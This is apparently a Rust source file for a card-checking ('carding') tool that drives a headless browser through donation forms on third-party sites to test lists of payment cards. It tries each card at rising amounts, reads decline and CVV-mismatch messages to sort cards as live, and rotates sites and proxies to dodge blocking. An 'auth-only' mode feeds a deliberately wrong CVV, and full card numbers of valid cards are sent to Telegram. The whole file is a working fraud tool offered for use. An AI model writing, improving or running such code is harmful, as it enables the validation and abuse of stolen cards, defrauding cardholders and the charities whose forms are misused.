use crate::common::{CardData, CheckResult, Gate, BACKOFF_AMOUNTS};
use crate::stats::Stats;
use anyhow::{Context, Result};
use colored::*;
use std::fs;
use std::io::Write;
use std::time::Duration;
use thirtyfour::prelude::*;

/// Wait for element to be interactable with retry logic
async fn wait_and_interact<F, Fut>(
    driver: &WebDriver,
    selector: &str,
    action: F,
    max_retries: u32,
) -> Result<()>
where
    F: Fn(WebElement) -> Fut,
    Fut: std::future::Future<Output = Result<(), WebDriverError>>,
{
    for attempt in 0..max_retries {
        if let Ok(element) = driver.find(By::Css(selector)).await {
            // Wait for element to be displayed and enabled
            tokio::time::sleep(Duration::from_millis(500)).await;
            
            // Scroll element into view
            driver.execute("arguments[0].scrollIntoView({block: 'center'});", vec![element.to_json()?]).await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            
            // Try the action
            match action(element).await {
                Ok(_) => return Ok(()),
                Err(e) if attempt < max_retries - 1 => {
                    // Element not interactable, wait and retry
                    tokio::time::sleep(Duration::from_secs(1)).await;
                    continue;
                }
                Err(e) => return Err(e.into()),
            }
        }
    }
    
    anyhow::bail!("Element not found or not interactable: {}", selector)
}

/// Try to make a donation with the given amount - PROVEN WORKING VERSION from checker_v2
pub async fn try_donation(
    driver: &WebDriver,
    card: &CardData,
    gate_url: &str,
    amount: f64,
) -> Result<String> {
    // Navigate to donation page
    driver.goto(gate_url).await?;
    tokio::time::sleep(Duration::from_secs(4)).await;
    
    // Try to find and fill amount field with retry logic
    let amount_selectors = vec![
        "input[name*='amount']",
        "input[id*='amount']",
        "input[name*='donation']",
        "input[id*='donation']",
        "input[type='number']",
        "#amount",
        "#donation-amount",
        "#custom-amount",
    ];
    
    let mut amount_filled = false;
    for selector in &amount_selectors {
        if let Ok(_) = wait_and_interact(
            driver,
            selector,
            |elem| async move {
                elem.click().await?;
                tokio::time::sleep(Duration::from_millis(500)).await;
                elem.clear().await?;
                elem.send_keys(&amount.to_string()).await
            },
            3, // 3 retries
        ).await {
            amount_filled = true;
            break;
        }
    }
    
    // If no input field, try clicking amount button
    if !amount_filled {
        let amount_str = format!("${}", amount);
        if let Ok(buttons) = driver.find_all(By::Css("button, a, div[role='button']")).await {
            for button in buttons {
                if let Ok(text) = button.text().await {
                    if text.contains(&amount_str) || text.contains(&amount.to_string()) {
                        // Scroll into view and click
                        driver.execute("arguments[0].scrollIntoView({block: 'center'});", vec![button.to_json()?]).await?;
                        tokio::time::sleep(Duration::from_millis(500)).await;
                        button.click().await?;
                        amount_filled = true;
                        break;
                    }
                }
            }
        }
    }
    
    tokio::time::sleep(Duration::from_secs(2)).await;
    
    // Check if we need to switch to Stripe iframe
    let mut in_iframe = false;
    let iframe_selectors = vec!["iframe[name*='stripe']", "iframe[src*='stripe']"];
    
    for selector in &iframe_selectors {
        if let Ok(iframe) = driver.find(By::Css(*selector)).await {
            tokio::time::sleep(Duration::from_secs(1)).await;
            driver.switch_to().frame_element(&iframe).await?;
            in_iframe = true;
            
            // Fill card in iframe with retry logic
            if let Ok(_) = wait_and_interact(
                driver,
                "input[name='cardnumber'], input[placeholder*='Card']",
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    elem.send_keys(&card.number).await
                },
                3,
            ).await {
                // Fill expiry
                let _ = wait_and_interact(
                    driver,
                    "input[name='exp-date'], input[placeholder*='MM']",
                    |elem| async move {
                        elem.click().await?;
                        tokio::time::sleep(Duration::from_millis(300)).await;
                        elem.send_keys(&format!("{}{}", card.month, &card.year[2..])).await
                    },
                    3,
                ).await;
                
                // Fill CVV
                let _ = wait_and_interact(
                    driver,
                    "input[name='cvc'], input[placeholder*='CVC']",
                    |elem| async move {
                        elem.click().await?;
                        tokio::time::sleep(Duration::from_millis(300)).await;
                        elem.send_keys(&card.cvv).await
                    },
                    3,
                ).await;
                
                driver.switch_to().default_content().await?;
                break;
            }
        }
    }
    
    // If not in iframe, fill directly with retry logic
    if !in_iframe {
        // Card number
        let card_selectors = vec![
            "input[name*='card']",
            "input[id*='card']",
            "input[autocomplete='cc-number']"
        ];
        
        for selector in &card_selectors {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    elem.send_keys(&card.number).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // Month
        for selector in &["input[name*='month']", "select[name*='month']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.month).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // Year
        for selector in &["input[name*='year']", "select[name*='year']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.year).await
                },
                3,
            ).await {
                break;
            }
        }
        
        // CVV
        for selector in &["input[name*='cvv']", "input[name*='cvc']", "input[id*='cvv']"] {
            if let Ok(_) = wait_and_interact(
                driver,
                selector,
                |elem| async move {
                    elem.click().await?;
                    tokio::time::sleep(Duration::from_millis(300)).await;
                    elem.send_keys(&card.cvv).await
                },
                3,
            ).await {
                break;
            }
        }
    }
    
    // Fill email and name with retry logic
    let _ = wait_and_interact(
        driver,
        "input[type='email'], input[name*='email']",
        |elem| async move {
            elem.click().await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            elem.send_keys("donor@example.com").await
        },
        3,
    ).await;
    
    let _ = wait_and_interact(
        driver,
        "input[name*='name'], input[id*='name']",
        |elem| async move {
            elem.click().await?;
            tokio::time::sleep(Duration::from_millis(300)).await;
            elem.send_keys("Test Donor").await
        },
        3,
    ).await;
    
    tokio::time::sleep(Duration::from_secs(1)).await;
    
    // Find and click submit button with retry logic
    let submit_selectors = vec![
        "button[type='submit']",
        "input[type='submit']",
        "#submit",
        "#donate-button",
    ];
    
    for selector in &submit_selectors {
        if let Ok(_) = wait_and_interact(
            driver,
            selector,
            |elem| async move { elem.click().await },
            3,
        ).await {
            break;
        }
    }
    
    // Wait longer for payment processing
    tokio::time::sleep(Duration::from_secs(8)).await;
    
    // Get current URL to check for redirect
    let current_url = driver.current_url().await?;
    let url_lower = current_url.to_string().to_lowercase();
    
    // Get page content to analyze result
    let page_source = driver.source().await?;
    let content_lower = page_source.to_lowercase();
    
    // First check for explicit error messages (most reliable)
    
    // CVV mismatch indicators (check first as they're most specific)
    let cvv_indicators = [
        "incorrect_cvc", "invalid_cvc", "incorrect cvc", "invalid cvc",
        "security code is incorrect", "security code is invalid",
        "cvv is incorrect", "cvc is incorrect", "cvv2 is incorrect",
        "card's security code is incorrect", "card verification",
        "security code does not match", "cvc does not match",
    ];
    
    for indicator in &cvv_indicators {
        if content_lower.contains(indicator) {
            return Ok("CVV_MISMATCH".to_string());
        }
    }
    
    // Insufficient funds
    let insufficient_indicators = [
        "insufficient funds", "insufficient_funds", "not enough funds",
        "insufficient balance", "card has insufficient funds",
    ];
    
    for indicator in &insufficient_indicators {
        if content_lower.contains(indicator) {
            return Ok("INSUFFICIENT_FUNDS".to_string());
        }
    }
    
    // Declined indicators
    let declined_indicators = [
        "card was declined", "card has been declined", "payment declined",
        "transaction declined", "declined by", "card declined",
        "payment was declined", "your card was declined",
        "do not honor", "generic_decline", "card_declined",
    ];
    
    for indicator in &declined_indicators {
        if content_lower.contains(indicator) {
            return Ok("DECLINED".to_string());
        }
    }
    
    // Check for success indicators (must be very specific)
    // Look for URL changes that indicate success
    let success_url_indicators = [
        "/thank", "/success", "/complete", "/confirmation", "/receipt",
    ];
    
    let mut url_indicates_success = false;
    for indicator in &success_url_indicators {
        if url_lower.contains(indicator) {
            url_indicates_success = true;
            break;
        }
    }
    
    // Look for very specific success messages in content
    let success_content_indicators = [
        "payment successful", "donation successful", "thank you for your donation",
        "your donation has been", "donation received", "payment received",
        "transaction successful", "order confirmed", "payment confirmed",
        "donation confirmed", "contribution received", "thank you for contributing",
    ];
    
    let mut content_indicates_success = false;
    for indicator in &success_content_indicators {
        if content_lower.contains(indicator) {
            content_indicates_success = true;
            break;
        }
    }
    
    // Only return CHARGED if we have strong evidence
    if url_indicates_success || content_indicates_success {
        // Double-check we don't have error messages
        if !content_lower.contains("error") 
            && !content_lower.contains("declined") 
            && !content_lower.contains("failed") {
            return Ok("CHARGED".to_string());
        }
    }
    
    // If we can't determine, assume declined (safer than false positive)
    Ok("DECLINED".to_string())
}

/// Quick HTTP check to filter out dead/inaccessible gates
async fn http_prescreen_gates(gates: &[Gate]) -> Vec<Gate> {
    println!("\n{}", "🔍 Step 1: HTTP pre-screening gates (fast)...".cyan());
    println!("{}", "   Timeout: 3 seconds per gate".dimmed());
    std::io::stdout().flush().ok();
    
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(3))  // Reduced from 5 to 3 seconds
        .build()
        .unwrap();
    
    let mut accessible_gates = Vec::new();
    let start_time = std::time::Instant::now();
    
    for (idx, gate) in gates.iter().enumerate() {
        let gate_start = std::time::Instant::now();
        
        print!("\r{} [{}/{}] Checking: {}{}",
            "→".cyan(), 
            idx + 1, 
            gates.len(),
            if gate.url.len() > 50 { &gate.url[..50] } else { &gate.url },
            " ".repeat(20)  // Clear previous text
        );
        std::io::stdout().flush().ok();
        
        // Quick HTTP check with timeout
        match tokio::time::timeout(
            Duration::from_secs(3),
            client.get(&gate.url).send()
        ).await {
            Ok(Ok(response)) => {
                if response.status().is_success() {
                    if let Ok(text) = response.text().await {
                        let text_lower = text.to_lowercase();
                        // Check if it's actually a Shopify site with checkout
                        if text_lower.contains("shopify") || 
                           text_lower.contains("checkout") || 
                           text_lower.contains("donate") ||
                           text_lower.contains("donation") {
                            let elapsed = gate_start.elapsed().as_millis();
                            println!("\r{} [{}/{}] {} ✓ Accessible ({}ms){}",
                                "→".green(),
                                idx + 1,
                                gates.len(),
                                if gate.url.len() > 40 { &gate.url[..40] } else { &gate.url },
                                elapsed,
                                " ".repeat(20)
                            );
                            accessible_gates.push(gate.clone());
                        } else {
                            println!("\r{} [{}/{}] {} ✗ Not Shopify{}",
                                "→".yellow(),
                                idx + 1,
                                gates.len(),
                                if gate.url.len() > 40 { &gate.url[..40] } else { &gate.url },
                                " ".repeat(20)
                            );
                        }
                    }
                } else {
                    println!("\r{} [{}/{}] {} ✗ HTTP {}{}",
                        "→".red(),
                        idx + 1,
                        gates.len(),
                        if gate.url.len() > 40 { &gate.url[..40] } else { &gate.url },
                        response.status().as_u16(),
                        " ".repeat(20)
                    );
                }
            }
            Ok(Err(e)) => {
                println!("\r{} [{}/{}] {} ✗ Error: {}{}",
                    "→".red(),
                    idx + 1,
                    gates.len(),
                    if gate.url.len() > 30 { &gate.url[..30] } else { &gate.url },
                    if e.to_string().len() > 20 { &e.to_string()[..20] } else { &e.to_string() },
                    " ".repeat(20)
                );
            }
            Err(_) => {
                println!("\r{} [{}/{}] {} ⏱️  Timeout (>3s){}",
                    "→".yellow(),
                    idx + 1,
                    gates.len(),
                    if gate.url.len() > 40 { &gate.url[..40] } else { &gate.url },
                    " ".repeat(20)
                );
            }
        }
    }
    
    let total_time = start_time.elapsed().as_secs();
    println!("\n{} Pre-screening complete in {}s", "✓".green(), total_time);
    println!("{} Found {} accessible gates (filtered out {} dead/slow gates)", 
        "✓".green(), accessible_gates.len(), gates.len() - accessible_gates.len());
    
    accessible_gates
}

/// Find a working gate by testing with REAL card (validates payment processing)
async fn find_working_gate(
    driver: &WebDriver, 
    gates: &[Gate], 
    test_card: &CardData
) -> Result<Option<Gate>> {
    println!("\n{}", "🔍 Step 2: Testing gates with real card (validates payment)...".cyan());
    println!("{}", "   Timeout: 25 seconds per gate".dimmed());
    println!("{}", "   Using first card to validate payment processing".dimmed());
    std::io::stdout().flush().ok();
    
    for (idx, gate) in gates.iter().enumerate() {
        let gate_start = std::time::Instant::now();
        
        print!("\r{} [{}/{}] Testing: {}{}",
            "→".cyan(), 
            idx + 1, 
            gates.len(),
            if gate.url.len() > 50 { &gate.url[..50] } else { &gate.url },
            " ".repeat(20)
        );
        std::io::stdout().flush().ok();
        
        // Try with $1 amount (least likely to cause issues) with timeout
        match tokio::time::timeout(
            Duration::from_secs(25),  // 25 second timeout per gate
            try_donation(driver, test_card, &gate.url, 1.0)
        ).await {
            Ok(Ok(status)) => {
                let elapsed = gate_start.elapsed().as_secs();
                
                // Only accept if gate actually processes payments
                // CHARGED = gate works perfectly
                // CVV_MISMATCH = gate works, just wrong CVV
                // INSUFFICIENT_FUNDS = gate works, card has no money
                if status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS" {
                    println!("\r{} [{}/{}] {} ✓ WORKING! Status: {} ({}s){}",
                        "✓".green(),
                        idx + 1,
                        gates.len(),
                        if gate.url.len() > 30 { &gate.url[..30] } else { &gate.url },
                        status.yellow(),
                        elapsed,
                        " ".repeat(20)
                    );
                    return Ok(Some(gate.clone()));
                } else {
                    println!("\r{} [{}/{}] {} ✗ {} ({}s){}",
                        "→".yellow(),
                        idx + 1,
                        gates.len(),
                        if gate.url.len() > 30 { &gate.url[..30] } else { &gate.url },
                        status,
                        elapsed,
                        " ".repeat(20)
                    );
                }
            }
            Ok(Err(e)) => {
                println!("\r{} [{}/{}] {} ✗ Error: {}{}",
                    "→".red(),
                    idx + 1,
                    gates.len(),
                    if gate.url.len() > 30 { &gate.url[..30] } else { &gate.url },
                    if e.to_string().len() > 30 { &e.to_string()[..30] } else { &e.to_string() },
                    " ".repeat(20)
                );
            }
            Err(_) => {
                println!("\r{} [{}/{}] {} ⏱️  Timeout (>25s){}",
                    "→".yellow(),
                    idx + 1,
                    gates.len(),
                    if gate.url.len() > 40 { &gate.url[..40] } else { &gate.url },
                    " ".repeat(20)
                );
            }
        }
        
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    println!("\n{} No working gates found", "✗".red());
    Ok(None)
}

/// Load cards from file with progress indicator
pub fn load_cards_from_file(file_path: &str) -> Result<Vec<CardData>> {
    use std::io::{BufRead, BufReader};
    
    println!("{}", "→ Loading cards from file...".yellow());
    
    let file = fs::File::open(file_path)
        .context(format!("Failed to open cards file: {}", file_path))?;
    
    let reader = BufReader::new(file);
    let mut cards = Vec::new();
    let mut line_num = 0;
    let mut valid_count = 0;
    let mut error_count = 0;
    
    for line in reader.lines() {
        line_num += 1;
        
        // Show progress every 1000 lines
        if line_num % 1000 == 0 {
            print!("\r{} Loaded {} cards ({} errors)...", "→".cyan(), valid_count, error_count);
            std::io::stdout().flush().ok();
        }
        
        let line = match line {
            Ok(l) => l,
            Err(_) => {
                error_count += 1;
                continue;
            }
        };
        
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        
        match CardData::from_string(line) {
            Ok(card) => {
                cards.push(card);
                valid_count += 1;
            }
            Err(_) => {
                error_count += 1;
            }
        }
    }
    
    println!("\r{} Loaded {} valid cards from {} lines ({} errors)", 
        "✓".green(), valid_count, line_num, error_count);
    
    if cards.is_empty() {
        anyhow::bail!("No valid cards found in file");
    }
    
    Ok(cards)
}

/// Run the rotational gate checker
pub async fn run_checker_v3(
    gates_file: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
    auth_only: bool,
    proxy_file: Option<&str>,  // NEW: Proxy file for bypassing 403 errors
) -> Result<()> {
    use crate::proxy::ProxyPool;
    use crate::proxy_extension::ProxyExtension;
    
    // Display mode
    if auth_only {
        println!("\n{}", "🔐 AUTHORIZATION-ONLY MODE".bold().green());
        println!("{}", "   Using wrong CVV to check cards WITHOUT charging".yellow());
        println!("{}", "   Only CVV_MISMATCH responses will be counted as valid".yellow());
    } else {
        println!("\n{}", "💳 CHARGE MODE".bold().yellow());
        println!("{}", "   Using real CVV - cards may be charged!".red());
        println!("{}", "   Accepts: CHARGED, CVV_MISMATCH, INSUFFICIENT_FUNDS".yellow());
    }
    
    // Load proxy pool if provided
    let proxy_pool = if let Some(proxy_path) = proxy_file {
        println!("\n{}", "🔒 Loading proxies...".cyan());
        match ProxyPool::from_file(proxy_path) {
            Ok(pool) => {
                println!("{} Loaded {} proxies", "✓".green(), pool.len());
                println!("{} Proxy stats: {}", "ℹ".cyan(), pool.stats());
                Some(pool)
            }
            Err(e) => {
                println!("{} Failed to load proxies: {}", "⚠️".yellow(), e);
                println!("{}", "   Continuing without proxies...".yellow());
                None
            }
        }
    } else {
        None
    };
    // Load Telegram config if provided
    let telegram_cfg = if let Some(config_path) = telegram_config {
        crate::telegram::load_config(config_path).ok()
    } else {
        None
    };
    
    // Load donation gates - support both JSON and plain text formats
    let gates_content = fs::read_to_string(gates_file)?;
    let gates: Vec<Gate> = if gates_content.trim().starts_with('[') || gates_content.trim().starts_with('{') {
        // JSON format
        serde_json::from_str(&gates_content)?
    } else {
        // Plain text format (one URL per line)
        gates_content
            .lines()
            .filter(|line| !line.trim().is_empty() && !line.trim().starts_with('#'))
            .map(|line| Gate {
                url: line.trim().to_string(),
                gateway: String::new(),
                donation_form: false,
                title: None,
                has_shopify: false,
                has_shopify_payments: false,
                payment_gateway: None,
                donation_keywords_count: 0,
            })
            .collect()
    };
    
    // Load cards
    let cards = load_cards_from_file(cards_file)?;
    
    // Determine how many gates to use
    let gates_to_use = if let Some(max) = max_gates {
        &gates[..max.min(gates.len())]
    } else {
        &gates[..]
    };
    
    // Setup WebDriver with proxy if available
    let mut caps = DesiredCapabilities::chrome();
    caps.add_arg("--headless")?;
    caps.add_arg("--no-sandbox")?;
    caps.add_arg("--disable-dev-shm-usage")?;
    caps.add_arg("--disable-gpu")?;
    caps.add_arg("--window-size=1920,1080")?;
    caps.add_arg("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")?;
    
    // Add proxy extension if proxy pool is available
    let _proxy_extension = if let Some(ref pool) = proxy_pool {
        if let Some(proxy) = pool.get_next() {
            println!("{} Using proxy: {}:{}", "🔒".cyan(), proxy.host, proxy.port);
            let ext = ProxyExtension::new(&proxy)?;
            caps.add_arg(&format!("--load-extension={}", ext.path_str()))?;
            Some(ext)
        } else {
            println!("{} No proxies available", "⚠️".yellow());
            None
        }
    } else {
        None
    };

    let driver = WebDriver::new("http://localhost:9515", caps).await?;
    driver.set_page_load_timeout(Duration::from_secs(30)).await?;
    
    // Step 1: HTTP pre-screen to filter dead gates (FAST - ~1 sec per gate)
    let accessible_gates = http_prescreen_gates(gates_to_use).await;
    
    if accessible_gates.is_empty() {
        driver.quit().await?;
        anyhow::bail!("No accessible gates found. All gates appear to be dead or inaccessible.");
    }
    
    // Step 2: Use first real card to validate gate actually processes payments
    println!("\n{}", "Using first card from your list to validate gates...".yellow());
    let test_card = &cards[0];
    
    // Find initial working gate using real card
    let mut current_gate = match find_working_gate(&driver, &accessible_gates, test_card).await? {
        Some(gate) => gate,
        None => {
            driver.quit().await?;
            anyhow::bail!("No working gates found. All accessible gates failed to process payments.");
        }
    };
    
    // Initialize stats and display
    Stats::init_display();
    let mut stats = Stats::new(cards.len());
    stats.update_current_gate(&current_gate.url);
    
    let mut all_results = Vec::new();
    let mut consecutive_failures = 0;
    const ROTATION_THRESHOLD: usize = 3;
    
    // Check cards with rotational strategy
    for card in &cards {
        stats.update_current_card(&format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv));
        stats.display();
        
        // Create test card - use wrong CVV if in auth-only mode
        let test_card = if auth_only {
            CardData {
                number: card.number.clone(),
                month: card.month.clone(),
                year: card.year.clone(),
                cvv: "999".to_string(),  // Wrong CVV for authorization-only
            }
        } else {
            card.clone()
        };
        
        // Try card on current gate with exponential backoff
        let mut card_succeeded = false;
        
        for &amount in &BACKOFF_AMOUNTS {
            match try_donation(&driver, &test_card, &current_gate.url, amount).await {
                Ok(status) => {
                    // In auth-only mode, only accept CVV_MISMATCH
                    let is_success = if auth_only {
                        status == "CVV_MISMATCH"
                    } else {
                        status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS"
                    };
                    
                    if is_success {
                        // Success! Reset failure counter
                        consecutive_failures = 0;
                        
                        stats.record_result(&status);
                        stats.display();
                        
                        let result = CheckResult {
                            gate: current_gate.url.clone(),
                            card: card.masked(),
                            amount,
                            status: status.clone(),
                            success: true,
                        };
                        
                        all_results.push(result.clone());
                        
                        // Send to Telegram if configured
                        if let Some(ref cfg) = telegram_cfg {
                            let bin = if card.number.len() >= 6 { &card.number[..6] } else { "UNKNOWN" };
                            let bin_info = crate::bin_lookup::lookup_bin(bin).unwrap_or_default();
                            
                            let _ = crate::telegram::notify_success(
                                cfg,
                                &format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv),
                                &result.gate,
                                result.amount,
                                &result.status,
                                &bin_info,
                            );
                        }
                        
                        card_succeeded = true;
                        break;
                    } else if status == "DECLINED" {
                        // Continue to next amount
                        consecutive_failures += 1;
                    }
                }
                Err(_) => {
                    consecutive_failures += 1;
                    stats.record_error();
                }
            }
            
            // Check if we need to rotate gate
            if consecutive_failures >= ROTATION_THRESHOLD {
                println!("\n{} Gate failed {} times consecutively - rotating...", 
                    "⚠️".yellow(), ROTATION_THRESHOLD);
                
                // Find new working gate from accessible gates
                match find_working_gate(&driver, &accessible_gates, &cards[0]).await? {
                    Some(new_gate) => {
                        current_gate = new_gate;
                        stats.update_current_gate(&current_gate.url);
                        consecutive_failures = 0;
                        println!("{} Switched to: {}", "✓".green(), current_gate.url);
                    }
                    None => {
                        driver.quit().await?;
                        anyhow::bail!("No more working gates available");
                    }
                }
            }
            
            tokio::time::sleep(Duration::from_secs(2)).await;
        }
        
        if !card_succeeded {
            stats.record_result("DECLINED");
        }
        
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    
    // Close browser
    driver.quit().await?;
    
    // Save results
    if !all_results.is_empty() {
        let json = serde_json::to_string_pretty(&all_results)?;
        fs::write(output_file, json)?;
        
        // Save working gates
        let working_gates: Vec<String> = all_results
            .iter()
            .map(|r| r.gate.clone())
            .collect();
        
        let mut unique_gates = working_gates;
        unique_gates.sort();
        unique_gates.dedup();
        
        let working_gates_file = output_file.replace(".json", "_working_gates.txt");
        fs::write(&working_gates_file, unique_gates.join("\n"))?;
    }
    
    Ok(())
}
